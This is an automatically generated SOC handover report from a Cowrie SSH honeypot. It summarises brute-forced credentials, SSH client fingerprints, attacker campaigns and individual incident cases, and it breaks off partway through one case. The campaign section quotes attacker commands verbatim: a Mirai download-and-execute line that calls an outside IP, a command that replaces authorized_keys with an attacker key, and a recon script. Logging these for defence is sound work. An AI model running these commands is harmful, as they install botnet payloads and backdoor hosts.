# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-29 |
| **Generated At** | 2026-09-29T08:07:19Z |
| **Shift Time** | 08:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **432** |
| Confirmed Threats | **395** |
| False Positives Filtered | **37** (8.6%) |
| Unique Attacker IPs | **123** |
| Countries of Origin | **36** |
| High Severity Cases | **177** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **255** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **239** |
| Unique Credential Pairs | **140** |
| Unique Usernames | **43** |
| Unique Passwords | **90** |
| Successful Auth Pairs | **179** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 56 |
| `345gs5662d34` | 29 |
| `admin` | 22 |
| `support` | 14 |
| `developer` | 14 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 30 |
| `345gs5662d34` | 29 |
| `support` | 14 |
| `admin` | 11 |
| `starfish` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 29 |
| `support` | `support` | 14 |
| `root` | `3245gs5662d34` | 10 |
| `admin` | `admin` | 8 |
| `pi` | `starfish` | 8 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `123456789` | `195.178.110.217` | 2026-09-29T00:55:56 |
| `support` | `support` | `176.53.159.196` | 2026-09-29T00:57:14 |
| `admin` | `Administrator` | `195.178.110.217` | 2026-09-29T00:57:51 |
| `admin` | `access` | `195.178.110.217` | 2026-09-29T00:59:27 |
| `admin` | `admin` | `195.178.110.217` | 2026-09-29T01:01:00 |
| `admin` | `admin123` | `195.178.110.217` | 2026-09-29T01:02:27 |
| `admin` | `adminadmin` | `195.178.110.217` | 2026-09-29T01:03:55 |
| `admin` | `letmein` | `195.178.110.217` | 2026-09-29T01:05:31 |
| `admin` | `passw0rd` | `195.178.110.217` | 2026-09-29T01:07:09 |
| `admin` | `password` | `195.178.110.217` | 2026-09-29T01:09:02 |
| `admin` | `password1` | `195.178.110.217` | 2026-09-29T01:11:00 |
| `admin` | `qwerty` | `195.178.110.217` | 2026-09-29T01:12:32 |
| `apache` | `1234` | `195.178.110.217` | 2026-09-29T01:14:02 |
| `sales` | `Aa123456` | `45.224.97.244` | 2026-09-29T01:14:08 |
| `345gs5662d34` | `345gs5662d34` | `45.224.97.244` | 2026-09-29T01:14:11 |
| `sales` | `3245gs5662d34` | `45.224.97.244` | 2026-09-29T01:14:12 |
| `apache` | `12345678` | `195.178.110.217` | 2026-09-29T01:15:37 |
| `root` | `1234@` | `10.0.0.73` | 2026-09-29T01:15:40 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-29T01:15:43 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T01:15:44 |
| `sales` | `Aa123456` | `45.78.201.248` | 2026-09-29T01:16:54 |
| `345gs5662d34` | `345gs5662d34` | `45.78.201.248` | 2026-09-29T01:16:58 |
| `sales` | `3245gs5662d34` | `45.78.201.248` | 2026-09-29T01:17:01 |
| `apache` | `admin` | `195.178.110.217` | 2026-09-29T01:17:24 |
| `hibiki` | `hibiki` | `10.0.0.73` | 2026-09-29T01:18:56 |
| `hibiki` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T01:19:00 |
| `apache` | `apache` | `195.178.110.217` | 2026-09-29T01:19:22 |
| `root` | `Root123-` | `10.0.0.73` | 2026-09-29T01:20:19 |
| `apache` | `password` | `195.178.110.217` | 2026-09-29T01:20:49 |
| `root` | `12345ssdlh` | `10.0.0.73` | 2026-09-29T01:21:15 |
| `root` | `Hello@1234` | `10.0.0.73` | 2026-09-29T01:21:51 |
| `backup` | `123` | `195.178.110.217` | 2026-09-29T01:22:13 |
| `backup` | `12345678` | `195.178.110.217` | 2026-09-29T01:23:37 |
| `backup` | `password` | `195.178.110.217` | 2026-09-29T01:25:02 |
| `developer` | `1` | `195.178.110.217` | 2026-09-29T01:26:31 |
| `root` | `!QAZXSW@` | `10.0.0.73` | 2026-09-29T01:27:58 |
| `developer` | `123` | `195.178.110.217` | 2026-09-29T01:28:06 |
| `developer` | `1234` | `195.178.110.217` | 2026-09-29T01:29:49 |
| `developer` | `12345` | `195.178.110.217` | 2026-09-29T01:31:38 |
| `developer` | `123456` | `195.178.110.217` | 2026-09-29T01:33:24 |
| `developer` | `1234567` | `195.178.110.217` | 2026-09-29T01:34:47 |
| `developer` | `12345678` | `195.178.110.217` | 2026-09-29T01:36:08 |
| `developer` | `123456789` | `195.178.110.217` | 2026-09-29T01:37:30 |
| `root` | `admin` | `189.223.176.45` | 2026-09-29T01:37:35 |
| `developer` | `1234567890` | `195.178.110.217` | 2026-09-29T01:38:54 |
| `developer` | `abc123` | `195.178.110.217` | 2026-09-29T01:40:27 |
| `developer` | `password` | `195.178.110.217` | 2026-09-29T01:42:09 |
| `developer` | `qwerty` | `195.178.110.217` | 2026-09-29T01:43:53 |
| `root` | `3.1415926` | `10.0.0.73` | 2026-09-29T01:44:04 |
| `docker` | `123` | `195.178.110.217` | 2026-09-29T01:45:24 |
| `docker` | `123456` | `195.178.110.217` | 2026-09-29T01:46:51 |
| `docker` | `12345678` | `195.178.110.217` | 2026-09-29T01:48:16 |
| `support` | `support` | `10.0.0.73` | 2026-09-29T01:49:13 |
| `docker` | `123456789` | `195.178.110.217` | 2026-09-29T01:49:40 |
| `demo` | `qwerty` | `102.88.137.80` | 2026-09-29T01:51:24 |
| `345gs5662d34` | `345gs5662d34` | `102.88.137.80` | 2026-09-29T01:51:27 |
| `demo` | `3245gs5662d34` | `102.88.137.80` | 2026-09-29T01:51:28 |
| `root` | `P@ssw0rd123` | `94.154.43.69` | 2026-09-29T01:53:30 |
| `root` | `123` | `94.154.43.69` | 2026-09-29T01:53:40 |
| `jenkins` | `admin@123` | `138.197.195.44` | 2026-09-29T01:54:41 |
| `345gs5662d34` | `345gs5662d34` | `138.197.195.44` | 2026-09-29T01:54:43 |
| `jenkins` | `3245gs5662d34` | `138.197.195.44` | 2026-09-29T01:54:44 |
| `console` | `console` | `193.187.110.214` | 2026-09-29T02:02:46 |
| `admin` | `admin` | `34.140.24.228` | 2026-09-29T02:16:45 |
| `smile` | `smile123` | `156.225.14.74` | 2026-09-29T02:17:04 |
| `345gs5662d34` | `345gs5662d34` | `156.225.14.74` | 2026-09-29T02:17:08 |
| `smile` | `3245gs5662d34` | `156.225.14.74` | 2026-09-29T02:17:10 |
| `vincent` | `vincent123!` | `112.123.228.180` | 2026-09-29T02:22:10 |
| `invitado` | `invitado123` | `103.216.170.145` | 2026-09-29T02:25:47 |
| `345gs5662d34` | `345gs5662d34` | `103.216.170.145` | 2026-09-29T02:25:53 |
| `invitado` | `3245gs5662d34` | `103.216.170.145` | 2026-09-29T02:25:55 |
| `developer` | `developer2026` | `152.32.254.222` | 2026-09-29T02:26:47 |
| `345gs5662d34` | `345gs5662d34` | `152.32.254.222` | 2026-09-29T02:26:51 |
| `developer` | `3245gs5662d34` | `152.32.254.222` | 2026-09-29T02:26:53 |
| `root` | `` | `94.154.43.69` | 2026-09-29T02:32:21 |
| `admin` | `admin` | `138.226.239.233` | 2026-09-29T02:33:49 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-29T02:37:22 |
| `telecomadmin` | `admintelecom` | `138.226.239.233` | 2026-09-29T02:48:54 |
| `user` | `password@123` | `10.0.0.73` | 2026-09-29T02:56:24 |
| `user` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T02:56:30 |
| `root` | `Hk@123456` | `10.0.0.73` | 2026-09-29T02:57:15 |
| `admin123` | `admin123` | `10.0.0.73` | 2026-09-29T03:19:06 |
| `console` | `console` | `10.0.0.73` | 2026-09-29T03:21:40 |
| `admin123` | `admin123` | `77.90.185.17` | 2026-09-29T03:25:46 |
| `pi` | `starfish` | `121.167.171.219` | 2026-09-29T03:30:01 |
| `pi` | `starfish` | `92.93.186.228` | 2026-09-29T03:30:10 |
| `admin123` | `admin123` | `80.94.95.118` | 2026-09-29T03:31:56 |
| `komatsu` | `komatsu` | `117.72.212.5` | 2026-09-29T03:34:10 |
| `produccion` | `produccion123` | `14.103.118.25` | 2026-09-29T03:36:15 |
| `produccion` | `3245gs5662d34` | `14.103.118.25` | 2026-09-29T03:36:42 |
| `sam` | `sam123` | `118.196.142.135` | 2026-09-29T03:38:40 |
| `root` | `password` | `193.112.192.91` | 2026-09-29T03:46:27 |
| `root` | `oracle` | `193.112.192.91` | 2026-09-29T03:46:34 |
| `root` | `Oracle@2024` | `193.112.192.91` | 2026-09-29T03:50:53 |
| `root` | `Oracle123` | `193.112.192.91` | 2026-09-29T03:55:18 |
| `root` | `oci` | `193.112.192.91` | 2026-09-29T03:55:24 |
| `root` | `opc` | `193.112.192.91` | 2026-09-29T03:59:37 |
| `root` | `qwerty` | `193.112.192.91` | 2026-09-29T04:03:47 |
| `root` | `1q2w3e4r` | `193.112.192.91` | 2026-09-29T04:03:50 |
| `root` | `P@ssw0rd` | `193.112.192.91` | 2026-09-29T04:03:55 |
| `root` | `Changeme123` | `193.112.192.91` | 2026-09-29T04:03:58 |
| `root` | `ubuntu` | `193.112.192.91` | 2026-09-29T04:04:05 |
| `root` | `Hackers` | `193.112.192.91` | 2026-09-29T04:04:09 |
| `root` | `Contabo123` | `193.112.192.91` | 2026-09-29T04:04:14 |
| `root` | `toor` | `193.112.192.91` | 2026-09-29T04:04:28 |
| `opc` | `Oracle@2024` | `193.112.192.91` | 2026-09-29T04:05:05 |
| `ubuntu` | `ubuntu` | `193.112.192.91` | 2026-09-29T04:05:09 |
| `ubuntu` | `oracle` | `193.112.192.91` | 2026-09-29T04:05:12 |
| `admin` | `admin` | `193.112.192.91` | 2026-09-29T04:05:15 |
| `admin` | `oracle` | `193.112.192.91` | 2026-09-29T04:05:20 |
| `admin` | `Oracle@2024` | `193.112.192.91` | 2026-09-29T04:05:25 |
| `root` | `admin@888` | `45.123.110.70` | 2026-09-29T04:13:01 |
| `345gs5662d34` | `345gs5662d34` | `45.123.110.70` | 2026-09-29T04:13:05 |
| `root` | `3245gs5662d34` | `45.123.110.70` | 2026-09-29T04:13:07 |
| `"??$` | `#&7?495` | `169.211.128.234` | 2026-09-29T04:34:07 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\x8f\x8c\x8d\x8a\x8b\x88'` | `169.211.128.234` | 2026-09-29T04:34:41 |
| `lghkel	` | `zpz}ld	` | `169.211.128.234` | 2026-09-29T04:34:42 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\xdf\xda\xd3\xd7\xd0'` | `169.211.128.234` | 2026-09-29T04:35:15 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\xcf\xc9\xdb\xcc\xca\xc7'` | `169.211.128.234` | 2026-09-29T04:36:24 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xd4\xcb\xdf\xd0\xca\xdb\xdd\xd6'` | `169.211.128.234` | 2026-09-29T04:36:58 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xdf\xda\xd3\xd7\xd0'` | `169.211.128.234` | 2026-09-29T04:37:32 |
| `root` | `GM8182` | `169.211.128.234` | 2026-09-29T04:38:06 |
| `"??$` | `#)#$5=` | `169.211.128.234` | 2026-09-29T04:38:40 |
| `"??$` | `8%97%c`i` | `169.211.128.234` | 2026-09-29T04:39:14 |
| `admin` | `admin` | `92.117.89.101` | 2026-09-29T04:42:54 |
| `pia` | `pia` | `147.90.234.19` | 2026-09-29T04:43:59 |
| `345gs5662d34` | `345gs5662d34` | `147.90.234.19` | 2026-09-29T04:44:00 |
| `pia` | `3245gs5662d34` | `147.90.234.19` | 2026-09-29T04:44:00 |
| `soporte` | `s0p0rt3` | `186.47.77.39` | 2026-09-29T04:44:04 |
| `345gs5662d34` | `345gs5662d34` | `186.47.77.39` | 2026-09-29T04:44:07 |
| `soporte` | `3245gs5662d34` | `186.47.77.39` | 2026-09-29T04:44:08 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.7.176` | 2026-09-29T04:59:47 |
| `*1` | `$4` | `207.175.7.176` | 2026-09-29T04:59:55 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5583` | `207.175.7.176` | 2026-09-29T04:59:57 |
| `root` | `Support2026!` | `200.37.103.36` | 2026-09-29T05:06:06 |
| `345gs5662d34` | `345gs5662d34` | `200.37.103.36` | 2026-09-29T05:06:08 |
| `root` | `3245gs5662d34` | `200.37.103.36` | 2026-09-29T05:06:09 |
| `sriram` | `sriram` | `10.0.0.73` | 2026-09-29T05:08:52 |
| `sriram` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T05:08:55 |
| `sss` | `sss` | `10.0.0.73` | 2026-09-29T05:18:33 |
| `mcadmin` | `1234` | `50.6.250.47` | 2026-09-29T05:27:28 |
| `345gs5662d34` | `345gs5662d34` | `50.6.250.47` | 2026-09-29T05:27:29 |
| `mcadmin` | `3245gs5662d34` | `50.6.250.47` | 2026-09-29T05:27:29 |
| `team1` | `123456` | `41.89.96.242` | 2026-09-29T05:28:48 |
| `345gs5662d34` | `345gs5662d34` | `41.89.96.242` | 2026-09-29T05:28:52 |
| `team1` | `3245gs5662d34` | `41.89.96.242` | 2026-09-29T05:28:54 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.189.218.52` | 2026-09-29T05:35:56 |
| `*1` | `$4` | `35.189.218.52` | 2026-09-29T05:36:10 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `65.49.1.108` | 2026-09-29T05:36:11 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1498` | `35.189.218.52` | 2026-09-29T05:36:12 |
| `root` | `admin` | `193.112.192.91` | 2026-09-29T05:40:32 |
| `root` | `Welcome1` | `193.112.192.91` | 2026-09-29T05:41:10 |
| `opc` | `password` | `193.112.192.91` | 2026-09-29T05:41:41 |
| `opc` | `oracle` | `193.112.192.91` | 2026-09-29T05:41:44 |
| `admin` | `admin` | `138.226.239.234` | 2026-09-29T05:55:11 |
| `angel` | `123456` | `10.0.0.73` | 2026-09-29T06:04:26 |
| `angel` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T06:04:34 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.62.45.78` | 2026-09-29T06:10:40 |
| `*1` | `$4` | `34.62.45.78` | 2026-09-29T06:10:53 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 693` | `34.62.45.78` | 2026-09-29T06:10:55 |
| `root` | `1234@Abcd` | `10.0.0.73` | 2026-09-29T06:20:32 |
| `agent` | `agent` | `10.0.0.73` | 2026-09-29T06:24:02 |
| `admin` | `qq123456` | `10.0.0.73` | 2026-09-29T06:24:08 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T06:24:12 |
| `dovecot` | `dovecot123` | `10.0.0.73` | 2026-09-29T06:27:44 |
| `dovecot` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T06:27:50 |
| `root` | `P@ssw0rd_` | `91.231.218.149` | 2026-09-29T06:37:09 |
| `345gs5662d34` | `345gs5662d34` | `91.231.218.149` | 2026-09-29T06:37:12 |
| `root` | `3245gs5662d34` | `91.231.218.149` | 2026-09-29T06:37:13 |
| `5` | `5` | `106.38.205.224` | 2026-09-29T06:37:43 |
| `345gs5662d34` | `345gs5662d34` | `106.38.205.224` | 2026-09-29T06:37:48 |
| `5` | `3245gs5662d34` | `106.38.205.224` | 2026-09-29T06:37:50 |
| `support` | `support` | `182.53.50.34` | 2026-09-29T06:42:55 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `66.228.40.100` | 2026-09-29T06:44:19 |
| `root` | `Hello1234!` | `94.182.168.135` | 2026-09-29T06:44:33 |
| `345gs5662d34` | `345gs5662d34` | `94.182.168.135` | 2026-09-29T06:44:37 |
| `root` | `3245gs5662d34` | `94.182.168.135` | 2026-09-29T06:44:38 |
| `test` | `Huawei12#$` | `10.0.0.73` | 2026-09-29T06:48:33 |
| `test` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T06:48:39 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **432** |
| Sessions with Fingerprint | **26** |
| Unique HASSH Fingerprints | **26** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 59 |
| Go SSH scanner | 54 |
| Paramiko (Python) | 48 |
| OpenSSH | 18 |
| AsyncSSH (Python) | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 46 | 18 |
| `a2de0f306611...` | Mirai/variant | 42 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 35 | 1 |
| `390ffe68a68c...` | Modern SSH client | 8 | 4 |
| `d1c5d296d532...` | Modern SSH client | 7 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 46 | 18 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 42 | 1 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 35 | 1 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 10 | 9 | — |
| `390ffe68a68c...` | OpenSSH | 8 | 4 | Modern SSH client |
| `d1c5d296d532...` | AsyncSSH (Python) | 7 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `a704be057881...` | Paramiko (Python) | 6 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **15** |
| Campaign Clusters | **5** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 35 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 17 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 4 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1140, T1059.004` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.217`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `138.197.195.44`, `117.72.212.5`, `106.38.205.224`, `45.224.97.244`, `94.182.168.135`, `152.32.254.222`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/nokillbins/handshakebins.sh; busybox wget http://213.232.114.14/nokillbins/handshakebins.sh; curl -o handshakebins.sh http://213.232.114.14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114.14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114.14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *
```
Source IPs: `94.154.43.69`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **123** |
| Unique ASNs | **53** |
| High-Risk ASNs | **43** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 43 | HIGH |
| `AS396982` | Google LLC | 9 | HIGH |
| `AS398324` | Censys, Inc. | 8 | HIGH |
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS44589` | admin@ntservers.pro | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (169)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-351f02a7585b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 00:55 |
| **Last Seen** | 2026-09-29 00:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 00:55:56` | `cowrie.session.connect` |
| `2026-09-29 00:55:56` | `cowrie.client.version` |
| `2026-09-29 00:55:56` | `cowrie.client.kex` |
| `2026-09-29 00:55:56` | `cowrie.login.success` |
| `2026-09-29 00:55:57` | `cowrie.session.params` |
| `2026-09-29 00:55:57` | `cowrie.command.input` |
| `2026-09-29 00:55:57` | `cowrie.command.input` |
| `2026-09-29 00:55:57` | `cowrie.command.input` |
| `2026-09-29 00:55:57` | `cowrie.command.input` |
| `2026-09-29 00:55:57` | `cowrie.command.input` |
| `2026-09-29 00:55:57` | `cowrie.command.success` |
| `2026-09-29 00:55:57` | `cowrie.command.input` |
| `2026-09-29 00:55:57` | `cowrie.command.input` |
| `2026-09-29 00:55:57` | `cowrie.command.input` |
| `2026-09-29 00:55:57` | `cowrie.command.input` |
| `2026-09-29 00:55:57` | `cowrie.log.closed` |
| `2026-09-29 00:55:59` | `cowrie.session.params` |
| `2026-09-29 00:55:59` | `cowrie.command.input` |
| `2026-09-29 00:55:59` | `cowrie.log.closed` |
| `2026-09-29 00:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b994e64776

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-29 00:57 |
| **Last Seen** | 2026-09-29 00:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 00:57:13` | `cowrie.session.connect` |
| `2026-09-29 00:57:13` | `cowrie.client.version` |
| `2026-09-29 00:57:13` | `cowrie.client.kex` |
| `2026-09-29 00:57:14` | `cowrie.login.success` |
| `2026-09-29 00:57:14` | `cowrie.direct-tcpip.request` |
| `2026-09-29 00:57:14` | `cowrie.direct-tcpip.data` |
| `2026-09-29 00:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c92d717a7c4a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 00:57 |
| **Last Seen** | 2026-09-29 00:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 00:57:50` | `cowrie.session.connect` |
| `2026-09-29 00:57:50` | `cowrie.client.version` |
| `2026-09-29 00:57:50` | `cowrie.client.kex` |
| `2026-09-29 00:57:51` | `cowrie.login.success` |
| `2026-09-29 00:57:52` | `cowrie.session.params` |
| `2026-09-29 00:57:52` | `cowrie.command.input` |
| `2026-09-29 00:57:52` | `cowrie.command.input` |
| `2026-09-29 00:57:52` | `cowrie.command.input` |
| `2026-09-29 00:57:52` | `cowrie.command.input` |
| `2026-09-29 00:57:52` | `cowrie.command.input` |
| `2026-09-29 00:57:52` | `cowrie.command.success` |
| `2026-09-29 00:57:52` | `cowrie.command.input` |
| `2026-09-29 00:57:52` | `cowrie.command.input` |
| `2026-09-29 00:57:52` | `cowrie.command.input` |
| `2026-09-29 00:57:52` | `cowrie.command.input` |
| `2026-09-29 00:57:52` | `cowrie.log.closed` |
| `2026-09-29 00:57:53` | `cowrie.session.params` |
| `2026-09-29 00:57:53` | `cowrie.command.input` |
| `2026-09-29 00:57:53` | `cowrie.log.closed` |
| `2026-09-29 00:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-590fb5a9993c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 00:59 |
| **Last Seen** | 2026-09-29 00:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
